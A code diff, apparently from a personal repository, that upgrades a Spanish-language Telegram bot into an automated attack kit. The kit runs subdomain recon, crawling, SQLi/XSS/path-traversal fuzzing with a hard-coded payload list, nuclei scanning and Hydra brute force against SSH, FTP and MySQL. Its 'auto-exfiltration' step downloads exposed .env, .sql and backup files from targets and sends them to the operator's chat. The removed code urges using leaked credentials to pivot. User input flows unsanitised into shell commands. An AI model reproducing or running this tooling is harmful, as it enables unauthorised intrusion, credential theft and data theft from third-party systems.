@@ -11,241 +11,260 @@ YOUR_CHAT_ID = "6280594821"
 
 bot = telebot.TeleBot(TOKEN)
 
-# --- DETECTOR DE RUTA PARA HYDRA CLONADO (hydra.sh) ---
+# --- DETECTOR DE RUTA PARA HYDRA ---
 def obtener_comando_hydra():
-    # 1. Intenta ver si está instalado globalmente
     check = subprocess.run("command -v hydra", shell=True, capture_output=True)
     if check.returncode == 0:
         return "hydra"
-    
-    # 2. Busca el script local hydra.sh en la carpeta hermana
     ruta_script = os.path.abspath(os.path.join(os.getcwd(), "..", "hydra", "hydra.sh"))
-    
     if os.path.exists(ruta_script):
-        # Asegura permisos de ejecución
         subprocess.run(f"chmod +x {ruta_script}", shell=True)
-        # Retornamos el comando precedido por bash para asegurar su ejecución
         return f"bash {ruta_script}"
-        
     return None
 
-# --- MOTOR DE ANÁLISIS E IMPACTO ---
-def analizar_y_explicar(archivo_reporte):
-    impacto = "🔵 **ANÁLISIS DE IMPACTO**\n"
-    instrucciones = "👉 **GUÍA DE ACCIÓN:**\n"
+# --- MOTOR DE INTELIGENCIA Y ANÁLISIS DE RESPUESTAS ---
+def motor_inteligencia(archivo_reporte):
+    # Detección de errores, comparación de comportamiento y pattern matching
+    analisis = "🧠 **ANÁLISIS DE INTELIGENCIA V9.5**\n"
+    prioridad = "🟢 BAJA"
     
     with open(archivo_reporte, "r") as f:
         content = f.read().lower()
 
-    if any(x in content for x in ["critical", "high", ".env", "config", "password", "aws_"]):
-        impacto += "⚠️ **Nivel: CRÍTICO / ALTO**\nSe detectaron fugas de credenciales o archivos críticos."
-        instrucciones += "1. Analiza los archivos descargados; contienen accesos directos.\n2. Usa estos datos para pivotar en la infraestructura."
-    elif any(x in content for x in ["200", "medium", "backup", ".sql", ".log"]):
-        impacto += "⚠️ **Nivel: MEDIO**\nSe encontraron rutas expuestas, respaldos o logs."
-        instrucciones += "1. Revisa los logs en busca de nombres de usuario.\n2. Intenta un ataque de fuerza bruta con `/fuerza`."
-    else:
-        impacto += "ℹ {Nivel: INFORMACIÓN}\nSolo se detectó información técnica."
-        instrucciones += "1. Úsala para perfilar el servidor objetivo."
-    
-    return impacto, instrucciones
+    # Pattern Matching: SQLi, XSS, LFI, Credenciales
+    vulnerabilidades = []
+    if any(x in content for x in ["sql syntax", "mysql_fetch", "waitfor delay", "sql injection"]):
+        vulnerabilidades.append("💉 **Inyección SQL detectada** (Análisis de Error/Tiempo)")
+        prioridad = "🔴 CRÍTICA"
+    if any(x in content for x in ["<script>", "alert(", "xss-reflection"]):
+        vulnerabilidades.append("🧪 **XSS (Cross Site Scripting)**")
+        prioridad = "🟠 ALTA"
+    if any(x in content for x in ["root:x:0:0", "boot.ini", "/etc/passwd"]):
+        vulnerabilidades.append("📂 **LFI/RFI detectado** (Acceso a archivos)")
+        prioridad = "🔴 CRÍTICA"
+    if any(x in content for x in [".env", "aws_access_key", "db_password"]):
+        vulnerabilidades.append("🔐 **Fuga de Credenciales Críticas**")
+        prioridad = "🔴 CRÍTICA"
 
-# --- FUNCIÓN DE AUTO-EXFILTRACIÓN ---
-def descargar_filtracion(url, chat_id):
+    if vulnerabilidades:
+        analisis += f"Nivel: {prioridad}\n\n" + "\n".join(vulnerabilidades)
+    else:
+        analisis += "No se detectaron patrones de vulnerabilidad conocidos."
+    
+    return analisis
+
+# --- AUTO-EXFILTRACIÓN ---
+def exfiltrar_datos(url, chat_id):
     try:
         clean_url = url.strip()
-        file_name = "exfil_" + clean_url.split("/")[-1].split(" ")[0].replace(":", "_").replace("?", "_")
-        if not file_name or len(file_name) < 5: 
-            file_name = f"exfil_data_{int(time.time())}.txt"
-
-        subprocess.run(f"curl -s -k -L {clean_url} -o {file_name}", shell=True)
+        file_name = f"exfil_{int(time.time())}.txt"
+        # Request manipulation: Modificamos el User-Agent para evadir bloqueos simples
+        subprocess.run(f"curl -s -k -L -A 'Mozilla/5.0' {clean_url} -o {file_name}", shell=True)
         
         if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
             with open(file_name, "rb") as f:
-                bot.send_document(chat_id, f, caption=f"📥 **Archivo exfiltrado:**\n`{clean_url}`", parse_mode="Markdown")
+                bot.send_document(chat_id, f, caption=f"📥 **Datos extraídos de:**\n`{clean_url}`", parse_mode="Markdown")
             os.remove(file_name)
     except Exception as e:
-        print(f"Error en exfiltración: {e}")
+        print(f"Error exfiltrando: {e}")
 
 # --- MENÚ PRINCIPAL ---
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
         help_text = (
-            "🤖 **Bugtin Bot v8.10 - Expert Mode**\n\n"
-            "📡 `/subs` - Recon de subdominios.\n"
-            "🔓 `/archivos` - Escaneo y exfiltración automática.\n"
-            "🔍 `/fuzz` - Buscar paneles con logins.txt (Fix).\n"
-            "⚡ `/fuerza` - Ataque Hydra con ejemplos.\n\n"
-            "🚀 *Estado: Comando Gobuster corregido para Termux.*"
+            "🤖 **Bugtin Bot v9.5 - Ultimate Audit**\n\n"
+            "📡 `/subs` - Recon de Subdominios.\n"
+            "🕸️ `/crawl` - Mapeo de endpoints/formularios.\n"
+            "🔍 `/fuzz` - Fuzzing & Request Manipulation.\n"
+            "🔓 `/auditar` - Escaneo completo con IA.\n"
+            "⚡ `/fuerza` - Hydra (Fuerza bruta).\n\n"
+            "🚀 *Selecciona una opción del menú:* "
         )
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        markup.add("📡 Solo Subdominios", "🔓 Buscar Archivos Expuestos")
-        markup.add("🔍 Fuzzing de Logins", "⚡ Ataque de Fuerza Bruta")
+        markup.add("📡 Reconocimiento", "🕸️ Crawling Activo")
+        markup.add("🔍 Fuzzing Avanzado", "🔓 Auditoría IA")
+        markup.add("⚡ Ataque Hydra")
         bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode="Markdown")
 
-# --- LÓGICA: RECONOCIMIENTO ---
+# --- COMANDO: SUBDOMINIOS ---
 @bot.message_handler(commands=['subs'])
 def start_subs(message):
-    if str(message.chat.id) == YOUR_CHAT_ID:
-        msg = bot.send_message(message.chat.id, "🎯 **Escribe el dominio objetivo (ej: google.com):**")
-        bot.register_next_step_handler(msg, process_subdomains_step)
+    ejemplo = (
+        "📡 **Comando: /subs (Reconocimiento)**\n\n"
+        "Mapea todos los subdominios de un objetivo para ampliar la superficie de ataque.\n"
+        "💡 **Ejemplo:** `google.com` o `tesla.com`"
+    )
+    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
+    bot.register_next_step_handler(msg, process_subdomains_step)
 
 def process_subdomains_step(message):
     target = message.text.strip().lower()
     chat_id = message.chat.id
-    bot.send_message(chat_id, f"🚀 Extrayendo subdominios de `{target}`...")
-    output = "total_subs.txt"
-    subprocess.run("rm -f s1.txt s2.txt total_subs.txt", shell=True)
+    output = "subs_result.txt"
+    bot.send_message(chat_id, f"🚀 Escaneando subdominios de `{target}`...")
     try:
-        subprocess.run(f"subfinder -d {target} -o s1.txt -silent", shell=True)
-        if os.path.exists("common.txt"):
-            subprocess.run(f"gobuster dns --domain {target} --wordlist common.txt --quiet --output s2.txt", shell=True)
-        
-        subprocess.run(f"cat s1.txt s2.txt > {output} 2>/dev/null", shell=True)
-        subprocess.run(f"sort -u {output} -o {output}", shell=True)
-        
+        subprocess.run(f"subfinder -d {target} -silent -o {output}", shell=True)
         if os.path.exists(output) and os.path.getsize(output) > 0:
             with open(output, "rb") as f:
-                bot.send_document(chat_id, f, caption=f"🏁 Reconocimiento: {target}")
+                bot.send_document(chat_id, f, caption=f"🏁 Subdominios encontrados: {target}")
             os.remove(output)
         else:
-            bot.send_message(chat_id, "❌ No se encontraron resultados.")
+            bot.send_message(chat_id, "❌ No se encontraron subdominios públicos.")
     except Exception as e:
         bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
 
-# --- LÓGICA: FUZZING DE LOGINS (CORREGIDO) ---
-@bot.message_handler(commands=['fuzz'])
-def start_fuzzing(message):
-    if str(message.chat.id) == YOUR_CHAT_ID:
-        msg = bot.send_message(message.chat.id, "🎯 **Introduce la URL para buscar paneles (ej: https://objetivo.com):**")
-        bot.register_next_step_handler(msg, process_fuzzing_step)
+# --- COMANDO: CRAWLING (MAREO DE ENDPOINTS) ---
+@bot.message_handler(commands=['crawl'])
+def start_crawl(message):
+    ejemplo = (
+        "🕸️ **Comando: /crawl (Mapeo de Endpoints)**\n\n"
+        "Descubre automáticamente rutas, formularios, archivos JS y parámetros ocultos.\n"
+        "💡 **Ejemplo:** `https://example.com`"
+    )
+    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
+    bot.register_next_step_handler(msg, process_crawl_step)
 
-def process_fuzzing_step(message):
+def process_crawl_step(message):
     url = message.text.strip().lower()
     chat_id = message.chat.id
-    wordlist = "logins.txt"
-    output = "fuzz_results.txt"
-
-    if not os.path.exists(wordlist):
-        bot.send_message(chat_id, f"❌ No se encontró `{wordlist}`. Súbelo a la carpeta del bot.")
-        return
-
-    bot.send_message(chat_id, f"🔍 Escaneando rutas en `{url}`...")
+    output = "crawl_map.txt"
+    bot.send_message(chat_id, f"🕷️ Mapeando estructura de `{url}`...\nAnalizando formularios y scripts.", parse_mode="Markdown")
     try:
-        # CORRECCIÓN VERSIÓN 8.10: Se eliminó el flag '-z' que causaba error en Gobuster/Termux.
-        # Se añaden flags: -e (URL completa), -n (No imprimir banner), --quiet (Solo resultados).
-        subprocess.run(f"gobuster dir -u {url} -w {wordlist} --quiet -n -e --output {output}", shell=True)
-        
+        # Crawling recursivo con profundidad 3
+        subprocess.run(f"katana -u {url} -d 3 -jc -o {output} -silent", shell=True)
         if os.path.exists(output) and os.path.getsize(output) > 0:
-            with open(output, "r") as f:
-                resultados = f.read()
-                bot.send_message(chat_id, f"🎯 **Rutas Encontradas:**\n\n`{resultados}`", parse_mode="Markdown")
-            
-            with open(output, "rb") as doc:
-                bot.send_document(chat_id, doc, caption=f"📄 Fuzzing completo: {url}")
+            with open(output, "rb") as f:
+                bot.send_document(chat_id, f, caption=f"🗺️ Mapa de Endpoints: {url}")
             os.remove(output)
         else:
-            bot.send_message(chat_id, "✅ No se detectaron paneles de acceso públicos.")
-    except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Error en Fuzzing: {str(e)}")
-
-# --- LÓGICA: AUDITORÍA Y EXFILTRACIÓN ---
-@bot.message_handler(commands=['archivos'])
-def start_archivos(message):
-    if str(message.chat.id) == YOUR_CHAT_ID:
-        msg = bot.send_message(message.chat.id, "🎯 **Introduce la URL o Subdominio:**")
-        bot.register_next_step_handler(msg, process_vulns_step)
-
-def process_vulns_step(message):
-    target = message.text.strip().lower()
-    chat_id = message.chat.id
-    report_file = f"rep_{target.replace('/', '_')}.txt"
-    bot.send_message(chat_id, f"🔍 Auditando `{target}`...\n\nBuscando filtraciones automáticamente.", parse_mode="Markdown")
-    try:
-        subprocess.run(f"nuclei -u {target} -tags exposure,cve,config,panel -o {report_file} -silent", shell=True)
-        
-        if os.path.exists(report_file) and os.path.getsize(report_file) > 0:
-            imp, gui = analizar_y_explicar(report_file)
-            bot.send_message(chat_id, f"{imp}\n\n{gui}", parse_mode="Markdown")
-            
-            with open(report_file, "r") as f:
-                for line in f:
-                    if "http" in line and any(ext in line for ext in [".env", ".sql", ".log", ".json", ".conf", ".bak", ".old", ".yaml"]):
-                        match = re.search(r'https?://[^\s\[\]\(\)]+', line)
-                        if match:
-                            descargar_filtracion(match.group(0), chat_id)
-            
-            with open(report_file, "rb") as doc:
-                bot.send_document(chat_id, doc, caption=f"📄 Reporte de auditoría: {target}")
-            os.remove(report_file)
-        else:
-            bot.send_message(chat_id, f"✅ No se detectaron vulnerabilidades en `{target}`.")
+            bot.send_message(chat_id, "❌ No se pudo extraer la estructura de la web.")
     except Exception as e:
         bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
 
-# --- LÓGICA: FUERZA BRUTA (Hydra) ---
+# --- COMANDO: FUZZING (REQUEST MANIPULATION) ---
+@bot.message_handler(commands=['fuzz'])
+def start_fuzz(message):
+    ejemplo = (
+        "🔍 **Comando: /fuzz (Manipulación de Peticiones)**\n\n"
+        "Envía miles de payloads a un parámetro específico para detectar inyecciones.\n"
+        "💡 **Ejemplo:** `https://target.com/index.php?id=FUZZ` \n"
+        "*(El bot reemplazará FUZZ con inyecciones SQL/XSS)*"
+    )
+    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
+    bot.register_next_step_handler(msg, process_fuzz_step)
+
+def process_fuzz_step(message):
+    url = message.text.strip()
+    chat_id = message.chat.id
+    payloads = "adv_payloads.txt"
+    output = "fuzz_results.md"
+    
+    if "FUZZ" not in url:
+        bot.send_message(chat_id, "❌ Error: Debes incluir la palabra `FUZZ` en la URL para saber dónde inyectar.")
+        return
+
+    if not os.path.exists(payloads):
+        with open(payloads, "w") as f:
+            f.write("' OR 1=1--\n<script>alert(1)</script>\nadmin'--\n../../etc/passwd\nsleep(5)")
+
+    bot.send_message(chat_id, "🧪 Iniciando Fuzzing masivo...\nAnalizando tiempos de respuesta (Timing Analysis).")
+    try:
+        # FFuf para detección de anomalías y manipulación de peticiones
+        subprocess.run(f"ffuf -u {url} -w {payloads} -t 30 -o {output} -of md", shell=True)
+        if os.path.exists(output):
+            with open(output, "rb") as f:
+                bot.send_document(chat_id, f, caption="🎯 Resultados del Fuzzing de Payloads")
+            os.remove(output)
+    except Exception as e:
+        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
+
+# --- COMANDO: AUDITORÍA IA ---
+@bot.message_handler(commands=['auditar'])
+def start_audit(message):
+    ejemplo = (
+        "🔓 **Comando: /auditar (Escaneo con Inteligencia)**\n\n"
+        "Escaneo profundo de vulnerabilidades (CVEs, Exposiciones, Config) con análisis de impacto automático.\n"
+        "💡 **Ejemplo:** `https://objetivo.com` o `192.168.1.1`"
+    )
+    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
+    bot.register_next_step_handler(msg, process_audit_step)
+
+def process_audit_step(message):
+    target = message.text.strip().lower()
+    chat_id = message.chat.id
+    report = f"audit_{int(time.time())}.txt"
+    bot.send_message(chat_id, f"🛰️ Iniciando Auditoría IA en `{target}`...\nEscaneando vulnerabilidades conocidas.", parse_mode="Markdown")
+    try:
+        # Scanning Masivo con Nuclei
+        subprocess.run(f"nuclei -u {target} -silent -o {report}", shell=True)
+        
+        if os.path.exists(report) and os.path.getsize(report) > 0:
+            # Inteligencia: Análisis de respuestas y patrones
+            res_ia = motor_inteligencia(report)
+            bot.send_message(chat_id, res_ia, parse_mode="Markdown")
+            
+            # Exfiltración basada en contexto
+            with open(report, "r") as f:
+                for line in f:
+                    if "http" in line and any(x in line for x in [".env", ".sql", ".log", ".bak"]):
+                        match = re.search(r'https?://[^\s\[\]\(\)]+', line)
+                        if match: exfiltrar_datos(match.group(0), chat_id)
+            
+            with open(report, "rb") as f:
+                bot.send_document(chat_id, f, caption=f"📄 Reporte de Auditoría Final: {target}")
+            os.remove(report)
+        else:
+            bot.send_message(chat_id, "✅ No se detectaron vulnerabilidades críticas automáticas.")
+    except Exception as e:
+        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
+
+# --- COMANDO: HYDRA (FUERZA BRUTA) ---
 @bot.message_handler(commands=['fuerza'])
 def start_fuerza(message):
-    if str(message.chat.id) == YOUR_CHAT_ID:
-        ejemplos = (
-            "⚔️ **Ataque de Fuerza Bruta (Hydra)**\n\n"
-            "Escribe los datos en el siguiente formato:\n"
-            "`IP/Host Servicio Usuario` \n\n"
-            "💡 **Ejemplos de uso:**\n"
-            "• SSH: `192.168.1.1 ssh root` \n"
-            "• FTP: `ftp.objetivo.com ftp admin` \n"
-            "• Telnet: `10.0.0.5 telnet user` \n"
-            "• MySQL: `sql.db.com mysql root` \n\n"
-            "🚀 *El bot utilizará automáticamente 'passwords.txt' como diccionario.*"
-        )
-        msg = bot.send_message(message.chat.id, ejemplos, parse_mode="Markdown")
-        bot.register_next_step_handler(msg, process_fuerza_step)
+    ejemplo = (
+        "⚡ **Comando: /fuerza (Hydra)**\n\n"
+        "Ataque de fuerza bruta a servicios de red.\n"
+        "💡 **Formato:** `IP Servicio Usuario` \n"
+        "💡 **Ejemplo:** `192.168.1.5 ssh root`"
+    )
+    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
+    bot.register_next_step_handler(msg, process_fuerza_step)
 
 def process_fuerza_step(message):
     try:
-        comando_base = obtener_comando_hydra()
-        
-        if not comando_base:
-            bot.send_message(message.chat.id, "❌ **Hydra no encontrado.**\nAsegúrate de que el archivo `hydra.sh` esté en `../hydra/hydra.sh`.")
-            return
-
+        cmd = obtener_comando_hydra()
         data = message.text.split()
-        if len(data) < 3:
-            bot.send_message(message.chat.id, "❌ Formato incorrecto. Usa: `IP Servicio Usuario`.")
+        if not cmd or len(data) < 3:
+            bot.send_message(message.chat.id, "❌ Error: Faltan parámetros o Hydra no está instalado.")
             return
         
-        ip, servicio, user = data[0], data[1], data[2]
-        chat_id = message.chat.id
-        pass_list = "passwords.txt"
-        res_file = "hydra_res.txt"
+        ip, svc, user = data[0], data[1], data[2]
+        bot.send_message(message.chat.id, f"⚔️ Lanzando ataque contra `{ip}` ({svc})...")
         
-        if not os.path.exists(pass_list):
-            with open(pass_list, "w") as f: f.write("admin\n123456\npassword\nroot\n12345")
-
-        bot.send_message(chat_id, f"⚡ Iniciando ataque contra `{ip}` mediante `{servicio}`...")
+        # Rate limiting awareness: t 4 (hilos moderados para evitar bloqueos)
+        subprocess.run(f"{cmd} -l {user} -P passwords.txt -t 4 -f {ip} {svc} -o res_hydra.txt", shell=True)
         
-        # Ejecutamos el ataque
-        subprocess.run(f"{comando_base} -l {user} -P {pass_list} -t 4 -f {ip} {servicio} -o {res_file}", shell=True)
-        
-        if os.path.exists(res_file) and os.path.getsize(res_file) > 0:
-            with open(res_file, "r") as f:
-                bot.send_message(chat_id, f"🎯 **¡ACCESO OBTENIDO!**\n\n`{f.read()}`", parse_mode="Markdown")
-            os.remove(res_file)
+        if os.path.exists("res_hydra.txt"):
+            with open("res_hydra.txt", "r") as f:
+                bot.send_message(message.chat.id, f"🎯 **¡ACCESO OBTENIDO!**\n\n`{f.read()}`", parse_mode="Markdown")
+            os.remove("res_hydra.txt")
         else:
-            bot.send_message(chat_id, f"❌ No se encontró la contraseña para el usuario `{user}`.")
-            
+            bot.send_message(message.chat.id, "❌ Falló el ataque. Contraseña no encontrada.")
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")
 
-# --- BOTONES ---
-@bot.message_handler(func=lambda m: m.text == "📡 Solo Subdominios")
-def btn_subs(m): start_subs(m)
-@bot.message_handler(func=lambda m: m.text == "🔓 Buscar Archivos Expuestos")
-def btn_arch(m): start_archivos(m)
-@bot.message_handler(func=lambda m: m.text == "🔍 Fuzzing de Logins")
-def btn_fuzz(m): start_fuzzing(m)
-@bot.message_handler(func=lambda m: m.text == "⚡ Ataque de Fuerza Bruta")
-def btn_fuerza(m): start_fuerza(m)
+# --- MANEJADORES DE BOTONES ---
+@bot.message_handler(func=lambda m: m.text == "📡 Reconocimiento")
+def btn_recon(m): start_subs(m)
+@bot.message_handler(func=lambda m: m.text == "🕸️ Crawling Activo")
+def btn_crawl(m): start_crawl(m)
+@bot.message_handler(func=lambda m: m.text == "🔍 Fuzzing Avanzado")
+def btn_fuzz(m): start_fuzz(m)
+@bot.message_handler(func=lambda m: m.text == "🔓 Auditoría IA")
+def btn_aud(m): start_audit(m)
+@bot.message_handler(func=lambda m: m.text == "⚡ Ataque Hydra")
+def btn_hyd(m): start_fuerza(m)
 
-print("🚀 Bugtin Bot v8.10 Online. Gobuster corregido.")
+print("🚀 Bugtin Bot v9.5 Ultimate cargado. Inteligencia de Scanning Activa.")
 bot.polling()
